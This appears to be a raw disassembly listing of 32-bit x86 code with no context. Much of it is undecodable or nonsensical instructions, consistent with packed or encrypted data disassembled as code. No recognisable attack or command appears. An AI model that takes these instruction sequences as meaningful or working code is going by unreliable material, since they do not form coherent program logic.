  42fc9e:	sbb    al,0xeb
  42fca0:	lock repnz stos DWORD PTR es:[edi],eax
  42fca3:	(bad)  
  42fca4:	lahf   
  42fca5:	cmc    
  42fca6:	inc    ebx
  42fca7:	mov    fs,esi
  42fca9:	adc    ch,BYTE PTR [eax+0x0]
  42fcac:	int3   
  42fcad:	jne    0x42fcb0
  42fcaf:	bound  eax,QWORD PTR [ecx-0x1f]
  42fcb2:	jg     0x42fc5a
  42fcb4:	test   al,0x51
  42fcb6:	xor    BYTE PTR [ebp+0x60],bl
  42fcb9:	loop   0x42fc92
  42fcbb:	enter  0x78,0xe4
  42fcbf:	sbb    eax,0xab39a696
  42fcc4:	arpl   WORD PTR [ebp-0x31],ax
  42fcc7:	aam    0x2d
  42fcc9:	push   edi
  42fcca:	add    eax,ebp
  42fccc:	xor    BYTE PTR cs:[edi+esi*2+0x46],al
  42fcd1:	mov    eax,ds:0xa552720f
  42fcd6:	xchg   edi,eax
  42fcd7:	retf   
  42fcd8:	int3   
  42fcd9:	push   ss
  42fcda:	cli    
  42fcdb:	push   ebx
  42fcdc:	dec    ebp
  42fcdd:	fadd   QWORD PTR [eax]
  42fcdf:	call   0x4b25:0xa24fe095
  42fce6:	repz rol DWORD PTR [esp+edx*2],cl
  42fcea:	mov    ds:0x1690f473,al
  42fcef:	xchg   ebp,edx
  42fcf1:	inc    eax
  42fcf2:	mov    edi,DWORD PTR [esi]
  42fcf4:	fnsave [edx+0x4fb8fbf5]
  42fcfa:	bound  edx,QWORD PTR [edx+0x6a59028e]
  42fd00:	loop   0x42fc99
  42fd02:	push   edi
  42fd03:	adc    dl,BYTE PTR [ebp+0x3a]
  42fd06:	sbb    edi,DWORD PTR [esi-0x4f]
  42fd09:	xor    eax,0x5f6811b4
  42fd0e:	cmc    
  42fd0f:	sub    ebx,eax
  42fd11:	add    al,0x1e
  42fd13:	daa    
  42fd14:	jmp    0x42fcac
  42fd16:	mov    BYTE PTR [ebx],ah
  42fd18:	jl     0x42fd65
  42fd1a:	out    dx,al
  42fd1b:	xchg   DWORD PTR [edi+0x2d57368],eax
  42fd21:	inc    ebp
  42fd22:	mov    eax,0xc41a384e
  42fd27:	bound  ecx,QWORD PTR [edi]
  42fd29:	mov    dl,0xfd
  42fd2b:	(bad)  
  42fd2c:	stos   DWORD PTR es:[edi],eax
  42fd2d:	test   eax,0x7b758ee3
  42fd32:	jecxz  0x42fd00
  42fd34:	cld    
	...
  42fd95:	add    BYTE PTR [eax-0x40],cl
  42fd98:	ret    0xcaf0
  42fd9b:	bnd jp 0x42fd96
  42fd9e:	int3   
  42fd9f:	jae    0x42fda8
  42fda1:	adc    al,0x52
  42fda3:	adc    cl,BYTE PTR [eax-0x43]
  42fda6:	adc    eax,DWORD PTR [ecx]
  42fda8:	add    al,BYTE PTR [eax]
  42fdaa:	pop    es
  42fdab:	add    DWORD PTR [eax],eax
  42fdad:	add    BYTE PTR [ebx],al
  42fdaf:	loope  0x42fd8f
  42fdb1:	daa    
  42fdb2:	scas   eax,DWORD PTR es:[edi]
  42fdb3:	cmp    eax,0x5c5fbe98
  42fdb8:	(bad)  
  42fdb9:	sbb    eax,0x4ce9c77d
  42fdbe:	pop    esp
  42fdbf:	adc    eax,0xf8eaf756
  42fdc4:	pusha  
  42fdc5:	js     0x42fe08
  42fdc7:	jo     0x42fde3
  42fdc9:	jno    0x42fd69
  42fdcb:	lock outs dx,DWORD PTR ds:[esi]
  42fdcd:	push   ebx
  42fdce:	in     al,0xf2
  42fdd0:	pop    eax
  42fdd1:	enter  0x24ac,0xe6
  42fdd5:	xchg   ecx,eax
  42fdd6:	mov    ds:0x349f099b,al
  42fddb:	jno    0x42fe00
  42fddd:	dec    esp
  42fdde:	push   cs
  42fddf:	push   eax
  42fde0:	int3   
  42fde1:	and    ebx,edx
  42fde3:	(bad)  
  42fde4:	dec    ebp
  42fde5:	jne    0x42fd72
  42fde7:	daa    
  42fde8:	jnp    0x42fdc7
  42fdea:	prefetch BYTE PTR [ebp-0x58]
  42fdee:	xor    eax,0x6702ec32
  42fdf3:	inc    edi
  42fdf4:	iret   
  42fdf5:	inc    edx
  42fdf6:	sbb    al,0xde
  42fdf8:	push   edx
  42fdf9:	ret    
  42fdfa:	clc    
  42fdfb:	or     BYTE PTR [eax+0xa],0xf0
  42fdff:	or     eax,0x30f88f03
  42fe04:	mov    edi,0xdfdf36fe
  42fe09:	mov    ah,0x51
  42fe0b:	loope  0x42fe8c
  42fe0d:	jmp    0x95d92849
  42fe12:	jo     0x42fdd5
  42fe14:	jne    0x42fdc1
  42fe16:	mov    eax,ds:0x8359e8c5
  42fe1b:	xor    ah,BYTE PTR [ebp+0x34]
  42fe1e:	cmp    bl,bl
  42fe20:	add    bl,BYTE PTR [edi+0x49]
  42fe23:	cmp    esp,DWORD PTR [edx]
  42fe25:	pop    ecx
  42fe26:	xor    ebx,edx
  42fe28:	sbb    BYTE PTR [edx+0x11],cl
  42fe2b:	xchg   esi,eax
  42fe2c:	rol    BYTE PTR ds:0x6938177b,cl
  42fe32:	rcl    DWORD PTR [ecx-0x12cceccf],0xf
  42fe39:	imul   ch
  42fe3b:	loopne 0x42fe66
  42fe3d:	xchg   ecx,eax
  42fe3e:	ret    0xe69a
  42fe41:	ins    BYTE PTR es:[edi],dx
  42fe42:	scas   al,BYTE PTR es:[edi]
  42fe43:	and    esp,eax
  42fe45:	add    dh,BYTE PTR [esi]
  42fe47:	xor    BYTE PTR [ebp+edi*8-0x1f],ch
  42fe4b:	jp     0x42fe5b
  42fe4d:	or     bl,ch
  42fe4f:	push   ds
  42fe50:	out    dx,al
  42fe51:	sub    BYTE PTR [eax+0x19],cl
  42fe54:	push   es
  42fe55:	sub    ecx,DWORD PTR [ecx+0x10b9dd1d]
  42fe5b:	adc    bh,ah
  42fe5d:	push   ds
  42fe5e:	push   ebx
  42fe5f:	or     ecx,DWORD PTR [ecx]
  42fe61:	and    DWORD PTR [edx-0x7e24574],esp
  42fe67:	and    al,0x9
  42fe69:	xlat   BYTE PTR ds:[ebx]
  42fe6a:	fisubr DWORD PTR [ebx+ecx*4]
  42fe6d:	pop    esi
  42fe6e:	adc    DWORD PTR [edx+0x25fe3494],ebp
  42fe74:	fnstcw WORD PTR [eax]
  42fe76:	fs cwde 
  42fe78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe79:	test   edx,eax
  42fe7b:	jae    0x42feb7
  42fe7d:	aaa    
  42fe7e:	call   0xffa1:0x819a8527
  42fe85:	sub    BYTE PTR [ebx],0x67
  42fe88:	jns    0x42fea6
  42fe8a:	cs popa 
  42fe8c:	cmp    DWORD PTR [edi-0x2b],eax
  42fe8f:	out    dx,al
  42fe90:	(bad)  
  42fe91:	sub    cl,BYTE PTR ds:0x97627491
  42fe97:	lods   al,BYTE PTR ds:[esi]
  42fe98:	rcl    DWORD PTR [esi],cl
  42fe9a:	and    bp,WORD PTR [esi]
  42fe9d:	pop    es
  42fe9e:	lahf   
  42fe9f:	cdq    
  42fea0:	mov    WORD PTR [edx-0x54],?
  42fea3:	es test al,0x72
  42fea6:	xlat   BYTE PTR ds:[ebx]
  42fea7:	inc    esp
  42fea8:	mov    ds:0x536ecc54,eax
  42fead:	add    BYTE PTR [eax*4+0x52304ad9],cl
  42feb4:	add    BYTE PTR es:[eax],al
	...
  42ff13:	add    BYTE PTR [eax],al
  42ff15:	add    BYTE PTR [edi+eiz*2],al
  42ff18:	std    
  42ff19:	aaa    
  42ff1a:	(bad)  
  42ff1b:	mov    edi,0x2c6b77ce
  42ff20:	mov    WORD PTR [ecx],es
  42ff22:	leave  
  42ff23:	jbe    0x42ffa4
  42ff25:	les    ebx,FWORD PTR [edx]
  42ff27:	add    al,BYTE PTR [edx]
  42ff29:	add    BYTE PTR [edi],al
  42ff2b:	add    DWORD PTR [eax],eax
  42ff2d:	add    BYTE PTR [edx],dl
  42ff2f:	aas    
  42ff30:	jo     0x42feda
  42ff32:	adc    eax,0x20cf44e0
  42ff37:	xor    cl,BYTE PTR [ebx+0x38]
  42ff3a:	pop    esi
  42ff3b:	pop    ss
  42ff3c:	xor    cl,BYTE PTR [edi]
  42ff3e:	mov    ds:0xf1920796,al
  42ff43:	lea    esi,[ebx]
  42ff45:	mov    eax,0x7bb37c3c
  42ff4a:	pop    ds
  42ff4b:	jg     0x42ff46
  42ff4d:	inc    ebx
  42ff4e:	(bad)  
  42ff4f:	popf   
  42ff50:	push   edx
  42ff51:	pop    ecx
  42ff52:	sub    al,0x91
  42ff54:	addr16 xor al,0xbf
  42ff57:	test   al,ah
  42ff59:	and    ch,ch
  42ff5b:	mov    ds:0xafca36d1,al
  42ff60:	aas    
  42ff61:	bnd jp 0x42fef5
  42ff64:	dec    esp
  42ff65:	shl    ebp,cl
  42ff67:	or     ecx,DWORD PTR [ebx]
  42ff69:	dec    edx
  42ff6a:	mov    ebx,0xc50cb4f5
  42ff6f:	adc    al,0x85
  42ff71:	stc    
  42ff72:	std    
  42ff73:	retf   0xff29
  42ff76:	push   ds
  42ff77:	mov    ch,0xbd
  42ff79:	xchg   DWORD PTR [ecx+0x57e3215c],edi
  42ff7f:	mov    ecx,0x866d367d
  42ff84:	mov    ecx,0xe12f6679
  42ff89:	aam    0x75
  42ff8b:	cdq    
  42ff8c:	jmp    0xd0b5:0x3ed34890
  42ff93:	stc    
  42ff94:	cmp    al,0xbb
  42ff96:	sbb    DWORD PTR [eax-0x771d1997],esp
  42ff9c:	in     al,dx
  42ff9d:	inc    esi
  42ff9e:	push   es
  42ff9f:	leavew 
  42ffa1:	xlat   BYTE PTR ds:[ebx]
  42ffa2:	xchg   esp,eax
  42ffa3:	in     eax,dx
  42ffa4:	sahf   
  42ffa5:	or     bl,BYTE PTR [eax+0x63]
  42ffa8:	add    bl,BYTE PTR [esi-0x25]
  42ffab:	fcom   DWORD PTR ds:[edx+0x30524648]
  42ffb2:	in     al,dx
  42ffb3:	pop    ss
  42ffb4:	pop    ss
  42ffb5:	or     bh,BYTE PTR cs:[eax]
  42ffb8:	add    DWORD PTR [eax+0x40],edx
  42ffbb:	imul   DWORD PTR [ebx-0x6e]
  42ffbe:	sbb    ah,BYTE PTR [edi+eax*8+0x72]
  42ffc2:	fadd   DWORD PTR [edi]
  42ffc4:	retf   
  42ffc5:	daa    
  42ffc6:	inc    edi
  42ffc7:	push   es
  42ffc8:	add    BYTE PTR [esp+ebx*2+0x35e70eec],cl
  42ffcf:	dec    DWORD PTR [ecx-0x684fe2a4]
  42ffd5:	sub    dl,BYTE PTR [edx+esi*2+0x6f2b0ec8]
  42ffdc:	add    al,0xa6
  42ffde:	test   al,0x28
  42ffe0:	jmp    0xc0c9:0x131b7b7e
  42ffe7:	dec    edi
  42ffe8:	pushf  
  42ffe9:	les    esi,FWORD PTR [esi+0x1780ecc5]
  42ffef:	mov    esp,0xb95434da
  42fff4:	mov    eax,ds:0x795850ca
  42fff9:	sub    DWORD PTR [ebp-0x1a],ecx
  42fffc:	cmp    ebx,DWORD PTR [edx+edx*4+0xd]
  430000:	loope  0x42ffaf
  430002:	adc    BYTE PTR es:[edx+0xf5bcdd9],al
  430009:	leave  
  43000a:	jmp    0x6fe44be7
  43000f:	jbe    0x430033
  430011:	mov    bl,0xc6
  430013:	push   0xcf84dd07
  430018:	or     eax,0xb345f09e
  43001d:	ret    0x65ab
  430020:	add    ah,0x44
  430023:	mov    cl,BYTE PTR [ecx]
  430025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430026:	mov    edx,0x7c70d331
  43002b:	mov    ds:0x5f48560d,al
  430030:	repnz mov al,ds:0x211872
	...
  430096:	(bad)  
  430097:	ins    DWORD PTR es:[edi],dx
  430098:	aam    0xb5
  43009a:	(bad)  
  43009b:	mov    ebp,0x87aa7fe7
  4300a0:	mov    bl,0x9f
  4300a2:	adc    esi,DWORD PTR [edi]
  4300a4:	adc    ah,BYTE PTR [ebp+0x20321]
  4300aa:	and    al,BYTE PTR [eax]
  4300ac:	add    BYTE PTR [eax],al
  4300ae:	xlat   BYTE PTR ds:[ebx]
  4300af:	sbb    ebp,ecx
  4300b1:	retf   0x9085
  4300b4:	in     eax,dx
  4300b5:	out    dx,al
  4300b6:	mov    bl,0x1
  4300b8:	xchg   ebx,eax
  4300b9:	adc    dh,bh
  4300bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4300bc:	push   ecx
  4300bd:	fild   WORD PTR [ebx]
  4300bf:	in     al,0x76
  4300c1:	inc    ecx
  4300c2:	mov    BYTE PTR [edx-0x53],0xa9
  4300c6:	mov    esi,0x2ca8522f
  4300cb:	or     al,0x8e
  4300cd:	jae    0x430134
  4300cf:	add    al,BYTE PTR [eax]
	...
  430115:	add    BYTE PTR [ebp+0x55],cl
  430118:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43011e:	mov    esp,ebp
  430120:	or     al,ah
  430122:	dec    ebp
  430123:	add    bh,al
  430125:	add    BYTE PTR [eax],cl
  430127:	add    BYTE PTR [eax],al
  430129:	mov    DWORD PTR [eax],0x3ef44545
  43012f:	xor    eax,0x9c8b8500
  430134:	hlt    
  430135:	clc    
  430136:	retf   
  430137:	(bad)  
  430138:	enter  0x4d45,0xb8
  43013c:	mov    esi,DWORD PTR [esp+esi*8]
  43013f:	test   ebx,ecx
  430141:	pushf  
  430142:	enter  0x4df8,0x8b
  430146:	mov    DWORD PTR [ebp+0x8],0x894708
  43014d:	inc    ebp
  43014e:	mov    ebp,0xff8bfffc
  430153:	dec    ebp
  430154:	mov    ch,0xf4
  430156:	call   DWORD PTR [ebx-0x1]
  430159:	mov    ebx,0x8005322
  43015e:	call   DWORD PTR [ecx+0x8]
  430161:	pop    es
  430162:	jmp    0xb8:0x9cb4533
  430169:	call   0xc3:0x32f4728b
  430170:	call   0x8989:0x3c83203
  430177:	dec    ebp
  430178:	or     ah,al
  43017a:	inc    ebp
  43017b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430181:	xor    eax,DWORD PTR [eax]
  430183:	retf   
  430184:	ret    
  430185:	add    eax,esi
  430187:	enter  0x8945,0x64
  43018b:	dec    ebp
  43018c:	sbb    ah,cl
  43018e:	add    BYTE PTR [ebx-0xb87b277],cl
  430194:	dec    DWORD PTR [ebx-0xbcfb275]
  43019a:	test   DWORD PTR [ebx],esi
  43019c:	dec    ebx
  43019e:	inc    DWORD PTR [ebx]
  4301a0:	inc    eax
  4301a1:	enter  0x8989,0x64
  4301a5:	(bad)  
  4301a6:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4301aa:	cld    
  4301ab:	dec    DWORD PTR [ebp-0xa90001]
  4301b1:	push   edi
  4301b2:	mov    BYTE PTR [edx+0x1],ch
  4301b5:	and    BYTE PTR [eax],al
  4301b7:	pop    ecx
  4301b8:	inc    ebp
  4301b9:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4301bf:	push   0xffffff89
  4301c1:	pop    ecx
  4301c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301c3:	dec    ebp
  4301c4:	add    BYTE PTR [ecx+0x45fc088b],cl
  4301ca:	jne    0x430214
  4301cc:	lea    eax,[eax]
  4301ce:	fs (bad) 
  4301d0:	dec    DWORD PTR [eax]
  4301d2:	mov    DWORD PTR [eax],eax
  4301d4:	test   al,0x0
  4301d6:	add    BYTE PTR [ebp-0x18],cl
  4301d9:	xor    ebp,DWORD PTR [edx]
  4301db:	add    eax,DWORD PTR [eax]
  4301dd:	mov    eax,eax
  4301df:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301e6:	inc    ebp
  4301e7:	mov    DWORD PTR [ebx+0x459408],ecx
  4301ed:	popa   
  4301ee:	mov    esp,DWORD PTR [ebp-0x75]
  4301f1:	(bad)  
  4301f2:	cld    
  4301f3:	inc    eax
  4301f4:	cmp    bh,0x1
  4301f7:	lea    eax,[eax]
  4301f9:	and    BYTE PTR [eax],al
  4301fb:	inc    DWORD PTR [ecx-0x18]
  4301fe:	mov    ecx,DWORD PTR [ebx]
  430200:	cld    
  430201:	add    BYTE PTR [ecx+0x75014d],cl
  430207:	(bad)  
  430208:	xchg   ebp,eax
  430209:	sar    bh,1
  43020b:	inc    eax
  43020c:	inc    DWORD PTR [eax]
  43020e:	mov    eax,DWORD PTR [ebp-0x4]
  430211:	xor    edx,DWORD PTR [edx+0x7201be]
  430217:	add    BYTE PTR [edx],dl
  430219:	(bad)  
  43021a:	nop
  43021b:	inc    ebp
  43021c:	add    BYTE PTR [ebx-0x5afb0c00],cl
  430222:	mov    al,0xff
  430224:	add    bh,bh
  430226:	add    BYTE PTR [ebx],dh
  430228:	inc    DWORD PTR [ebx]
  43022a:	sbb    al,0x89
  43022c:	jne    0x43020a
  43022e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430234:	mov    eax,DWORD PTR [ebp-0xff0048]
  43023a:	mov    DWORD PTR [eax-0x70],0xee70e989
  430241:	inc    DWORD PTR [ebp-0x75]
  430244:	(bad)  [esp+ebp*8]
  430247:	test   DWORD PTR [esi-0x1],esp
  43024a:	inc    ebp
  43024b:	(bad)  
  43024c:	aas    
  43024d:	inc    ebp
  43024e:	(bad)  
  43024f:	lea    edi,[eax+edi*2-0x1]
  430253:	inc    edi
  430255:	mov    DWORD PTR [ecx],edi
  430257:	mov    al,ds:0x8b8000c7
  43025c:	out    dx,al
  43025d:	cld    
  43025e:	loopne 0x4301ed
  430260:	inc    ebp
  430261:	(bad)  
  430262:	in     al,dx
  430263:	(bad)  
  430264:	fisttp WORD PTR [eax+0x8801c7]
  43026a:	jecxz  0x4302b1
  43026c:	out    dx,al
  43026d:	inc    DWORD PTR [ebp-0x4]
  430270:	out    0x8d,eax
  430272:	aas    
  430273:	(bad)  
  430274:	call   0xcb2d78
  430279:	add    DWORD PTR [ebx-0x7f590400],ecx
  43027f:	add    BYTE PTR [ecx],al
  430281:	test   DWORD PTR [eax],eax
  430283:	wrmsr  
  430285:	jae    0x430272
  430287:	add    BYTE PTR [eax],al
  430289:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43028f:	add    esp,edi
  430291:	add    BYTE PTR [eax+0x450108],al
  430297:	mov    edi,DWORD PTR [ebp-0x6c]
  43029a:	add    DWORD PTR [eax],0x4
  43029d:	mov    eax,DWORD PTR [ebp+0x3]
  4302a0:	mov    edi,DWORD PTR [esp+edi*8]
  4302a3:	dec    ebp
  4302a4:	nop
  4302a5:	mov    eax,DWORD PTR [ecx]
  4302a7:	fadd   DWORD PTR [eax]
  4302a9:	add    BYTE PTR [ecx*4-0xafa000],al
  4302b0:	inc    ebp
  4302b1:	push   edx
  4302b2:	call   DWORD PTR [ebp-0x7b]
  4302b5:	mov    esi,DWORD PTR [ebp-0x74]
  4302b8:	mov    eax,DWORD PTR [eax]
  4302ba:	cld    
  4302bb:	mov    eax,DWORD PTR [eax+0x880103]
  4302c1:	add    BYTE PTR [ebp+0x6a],bh
  4302c4:	cmp    edi,0x10
  4302c7:	mov    WORD PTR [ebp+0x0],es
  4302ca:	mov    edx,DWORD PTR [edx-0x4]
  4302cd:	push   ecx
  4302ce:	nop
  4302cf:	inc    DWORD PTR [ecx]
  4302d1:	cld    
  4302d2:	add    BYTE PTR [ebp-0x26],bh
  4302d5:	mov    eax,DWORD PTR [eax]
  4302d7:	cld    
  4302d8:	push   eax
  4302d9:	nop
  4302da:	inc    ebp
  4302db:	add    edi,edi
  4302dd:	add    BYTE PTR [ebx+0x4de0f445],cl
  4302e3:	call   0x9446ca1b
  4302e8:	cmp    esp,ebx
  4302ea:	movntq QWORD PTR [esi],mm6
  4302ed:	mov    DWORD PTR [eax],0xb87c8b98
  4302f3:	test   ebx,eax
  4302f5:	jmp    DWORD PTR [esi-0x1]
  4302f8:	int    0xe9
  4302fa:	sub    esp,esp
  4302fc:	add    eax,DWORD PTR [ebp-0x30]
  4302ff:	fild   WORD PTR [ebp+0x3f]
  430302:	cmp    eax,edi
  430304:	je     0xc243e726
  43030a:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  430311:	(bad)  
  430312:	jne    0x4302a0
  430314:	mov    ebx,ecx
  430316:	cld    
  430317:	jl     0x43035e
  430319:	cmp    DWORD PTR [ebx+0x50b400],ecx
  43031f:	inc    ebp
  430320:	call   0xeb2cb0
  430325:	add    BYTE PTR [ebx-0x7f170301],cl
  43032b:	add    DWORD PTR es:[eax],eax
  43032e:	add    al,al
  430330:	xor    BYTE PTR [eax+0x3f],dl
  430333:	inc    ebp
  430334:	add    BYTE PTR [ebx+0xfcd88b],cl
  43033a:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430340:	add    DWORD PTR [ecx+0x458be845],ecx
  430346:	fmul   DWORD PTR [ebx+0x8bb800]
  43034c:	cld    
  43034d:	call   0xd82e12
  430352:	dec    DWORD PTR [ebx+0x108ee8ff]
  430358:	add    al,al
  43035a:	push   eax
  43035b:	es inc ebp
  43035d:	inc    ebp
  43035e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430364:	dec    DWORD PTR [ebx-0x3ff70301]
  43036a:	mov    DWORD PTR gs:[eax],eax
  43036d:	call   0x8b6b4932
  430372:	inc    ebp
  430373:	mov    eax,0xe8d8008b
  430378:	add    BYTE PTR [ecx],ch
  43037a:	mov    eax,DWORD PTR [eax]
  43037c:	cld    
  43037d:	mov    eax,eax
  43037f:	call   0x462b13d9
  430384:	sub    DWORD PTR [ebx-0x3c743000],ecx
  43038a:	cld    
  43038b:	mov    BYTE PTR [eax+0x8401c1],0x1
  430392:	xor    BYTE PTR [eax],al
  430394:	push   edi
  430395:	inc    ebp
  430396:	mov    DWORD PTR [ebx],esi
  430398:	in     al,0xb9
  43039a:	inc    ebp
  43039b:	lea    ecx,[ebx-0x3c370301]
  4303a1:	dec    ebp
  4303a2:	call   0x8dc1:0x308328b
  4303a9:	xchg   DWORD PTR [eax+0x1],eax
  4303ac:	inc    DWORD PTR [eax]
  4303ae:	call   0x432cf8
  4303b3:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4303b9:	jge    0x4303ee
  4303bb:	mov    eax,DWORD PTR [ebx]
  4303bd:	cld    
  4303be:	lea    edx,[eax+0xff0120]
  4303c4:	call   0x432d56
  4303c9:	push   eax
  4303ca:	inc    DWORD PTR [ebp-0x1c]
  4303cd:	mov    ecx,DWORD PTR [ebp-0x58]
  4303d0:	xor    eax,DWORD PTR [eax]
  4303d2:	add    edi,edi
  4303d4:	cmp    ebp,eax
  4303d6:	jne    0x4303fe
  4303d8:	mov    DWORD PTR [eax],0x8b004dd8
  4303de:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4303e5:	mov    eax,ebx
  4303e7:	cld    
  4303e8:	test   BYTE PTR [eax+0x32019a],bh
  4303ee:	mov    DWORD PTR [ebp+0x8],esi
  4303f1:	xor    eax,DWORD PTR [ebp-0x73]
  4303f4:	test   DWORD PTR [esp+esi*2-0x1],edi
  4303f8:	mov    ebp,eax
  4303fa:	mov    eax,0x33004d29
  4303ff:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  430405:	add    DWORD PTR [eax],eax
  430407:	add    BYTE PTR [ebp+0x30],al
  43040a:	mov    edx,DWORD PTR [edi-0x48]
  43040d:	add    ebx,0xffffffe4
  430410:	test   bp,cx
  430413:	je     0x430440
  430415:	mov    eax,DWORD PTR [ebx]
  430417:	cld    
  430418:	sar    BYTE PTR [eax+0x3b0145],1
  43041e:	pcmpeqw mm4,mm6
  430421:	xor    edi,edi
  430423:	lea    ecx,[ebx-0x239e7470]
  430429:	add    BYTE PTR [ebp+0x50],cl
  43042c:	cmp    eax,DWORD PTR [ebp+0x75]
  43042f:	mov    ebp,DWORD PTR [eax-0x68]
  430432:	test   DWORD PTR [eax],eax
  430434:	clc    
  430435:	push   DWORD PTR [ebp-0x1]
  430438:	lea    ecx,[eax]
  43043a:	int3   
  43043b:	inc    ebp
  43043c:	call   0xfb34cc
  430441:	jne    0x43043b
  430443:	xor    edi,DWORD PTR [ebp-0x41]
  430446:	jmp    0x4304ba
  430448:	mov    eax,DWORD PTR [eax]
  43044a:	mov    eax,0x339545c7
  43044f:	inc    DWORD PTR [ebx]
  430451:	push   DWORD PTR [ecx]
  430453:	xor    eax,0x50eb008b
  430458:	mov    eax,DWORD PTR [ebp-0x3c]
  43045b:	mov    eax,eax
  43045d:	cld    
  43045e:	clc    
  43045f:	ret    
  430460:	test   bh,al
  430462:	pop    es
  430463:	xchg   ebp,eax
  430464:	add    bh,bh
  430466:	inc    ebp
  430467:	dec    DWORD PTR [edi]
  430469:	pop    ds
  43046a:	sub    eax,DWORD PTR [eax]
  43046c:	add    BYTE PTR [eax+0x76],dl
  43046f:	push   ebp
  430470:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  430476:	or     al,0xcf
  430478:	inc    eax
  430479:	enter  0x745,0x72
  43047d:	inc    ebp
  43047e:	mov    eax,DWORD PTR [ecx]
  430480:	int3   
  430481:	add    BYTE PTR [ebp-0x75],al
  430484:	xor    eax,0xc74d9cb8
  430489:	xor    edx,eax
  43048b:	lea    eax,[ebp+0x4572f808]
  430491:	add    BYTE PTR [ebx-0x3c7423bb],cl
  430497:	fadd   st,st(6)
  430499:	rol    BYTE PTR [ebp+0x12],0x8b
  43049d:	inc    ebp
  43049e:	fmul   QWORD PTR [ebx-0x3c39233d]
  4304a4:	inc    ebp
  4304a5:	test   bh,al
  4304a7:	call   0xdcf8:0x898532f8
  4304ae:	inc    ebp
  4304af:	inc    ebp
  4304b0:	cmp    esi,DWORD PTR [ebx]
  4304b2:	pushf  
  4304b3:	mov    ecx,0xffb48dc7
  4304b8:	test   eax,ecx
  4304ba:	clc    
  4304bb:	dec    ebp
  4304bc:	inc    ebp
  4304bd:	mov    edi,DWORD PTR [ecx]
  4304bf:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4304c6:	test   edi,edi
  4304c8:	clc    
  4304c9:	test   DWORD PTR [ebp+0x45],0x89c8b3f
  4304d0:	(bad)  
  4304d1:	enter  0x18e8,0x85
  4304d5:	xor    eax,0xff459cf8
  4304da:	mov    edi,esp
  4304dc:	lock inc ebp
  4304de:	ret    
  4304df:	push   eax
  4304e0:	(bad)  
  4304e1:	idiv   BYTE PTR [ebp+0x0]
  4304e4:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4304ea:	add    BYTE PTR [ebx],dl
  4304ec:	jmp    0xce063e
  4304f1:	les    eax,FWORD PTR [ebp-0x35]
  4304f4:	mov    ecx,esi
  4304f6:	lock or al,cl
  4304f9:	clc    
  4304fa:	inc    ebp
  4304fb:	add    esi,DWORD PTR [ebx]
  4304fd:	jge    0x430502
  4304ff:	xor    edi,DWORD PTR [ebx]
  430501:	cmp    ecx,DWORD PTR [edi]
  430503:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  430508:	mov    edi,DWORD PTR [ecx]
  43050a:	test   al,0xcc
  43050c:	dec    ebp
  43050d:	test   BYTE PTR [ebx],dh
  43050f:	pop    es
  430510:	xor    eax,DWORD PTR [eax]
  430512:	add    ecx,DWORD PTR [esi]
  430514:	add    ecx,eax
  430516:	psraw  mm0,mm1
  430519:	sub    BYTE PTR [ebp+0x38],cl
  43051c:	mov    edi,DWORD PTR [ebx]
  43051e:	lock int3 
  430520:	shl    edx,1
  430522:	rol    BYTE PTR [ebp+0xc],1
  430525:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43052c:	jmp    0x770576
  430531:	pushf  
  430532:	inc    ebp
  430533:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  430539:	xor    ecx,ebx
  43053b:	add    ecx,esi
  43053d:	mov    esi,eax
  43053f:	enter  0x45af,0x8b
  430543:	xor    ecx,eax
  430545:	add    edx,DWORD PTR [ebp-0x77]
  430548:	sub    ecx,DWORD PTR [eax]
  43054a:	cmp    eax,DWORD PTR [ebp+0x77]
  43054d:	aad    0x8b
  43054f:	pushf  
  430550:	test   al,0xc7
  430552:	mov    DWORD PTR [eax-0x7747b00],ebp
  430558:	lods   al,BYTE PTR ds:[esi]
  430559:	inc    ebp
  43055a:	dec    ebp
  43055b:	cmp    dh,BYTE PTR [ebx]
  43055d:	pushf  
  43055e:	xor    eax,edi
  430560:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  430567:	inc    ebp
  430568:	dec    ebp
  430569:	cmp    BYTE PTR [ebx-0x2e380f64],cl
  43056f:	mov    esp,0xf80585d0
  430574:	inc    ebp
  430575:	inc    ebp
  430576:	jmp    0x4305b6
  430578:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43057f:	dec    ebp
  430580:	xor    esi,DWORD PTR [ebx]
  430582:	add    eax,DWORD PTR [ebx]
  430584:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43058a:	dec    ebp
  43058b:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430591:	out    dx,eax
  430592:	rol    BYTE PTR [eax],1
  430594:	add    eax,0xebc8458b
  430599:	dec    ebp
  43059a:	mov    ebp,DWORD PTR [ebx]
  43059c:	mov    esp,0x33f84d8b
  4305a1:	ret    
  4305a2:	xor    eax,esi
  4305a4:	add    ecx,eax
  4305a6:	add    eax,DWORD PTR [edx+0xc1010f]
  4305ac:	dec    ebp
  4305ad:	inc    ebp
  4305ae:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4305b4:	ror    bl,1
  4305b6:	add    eax,0xebc645ce
  4305bb:	scas   eax,DWORD PTR es:[edi]
  4305bc:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4305c2:	xor    ebp,DWORD PTR [ebx]
  4305c4:	xor    edi,DWORD PTR [ebx]
